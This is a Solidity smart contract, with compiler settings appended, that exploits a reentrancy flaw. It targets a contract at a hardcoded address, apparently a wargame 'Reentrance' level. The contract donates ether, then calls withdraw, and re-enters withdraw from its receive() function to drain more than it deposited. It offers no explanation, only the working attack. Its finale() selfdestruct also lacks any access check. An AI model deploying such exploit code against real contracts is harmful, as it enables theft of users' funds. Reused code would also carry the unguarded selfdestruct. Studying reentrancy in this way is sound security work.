// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Reentrance {
  function donate(address _to) external payable;
  function balanceOf(address _who) external view returns (uint balance);
  function withdraw(uint _amount) external;
}

contract Reentry {
  address owner;
  address target;
  bool drained;

  constructor(){
      owner = msg.sender;
      target = 0x7513E60fE07867cB425Aa3e1CA28776B58C3A816;
  }

  function donate() external payable {
    require(msg.sender == owner, "only owner");
    require(msg.value >= 1 ether, "send >= 1 ether");
    Reentrance(target).donate{value:msg.value}(address(this));
  }

  function withdraw() external payable  {
    require(msg.sender == owner, "only owner");
    uint balance = Reentrance(target).balanceOf(address(this));
    Reentrance(target).withdraw(balance);
  }


  function finale() external payable {
    selfdestruct(payable(msg.sender));
  }


  receive() external payable {
    if (drained == false) {
        drained = true;
        Reentrance(target).withdraw(1000000000000000000);
    }
  }

}

{
  "optimizer": {
    "enabled": true,
    "runs": 200
  },
  "outputSelection": {
    "*": {
      "*": [
        "evm.bytecode",
        "evm.deployedBytecode",
        "abi"
      ]
    }
  },
  "libraries": {}
}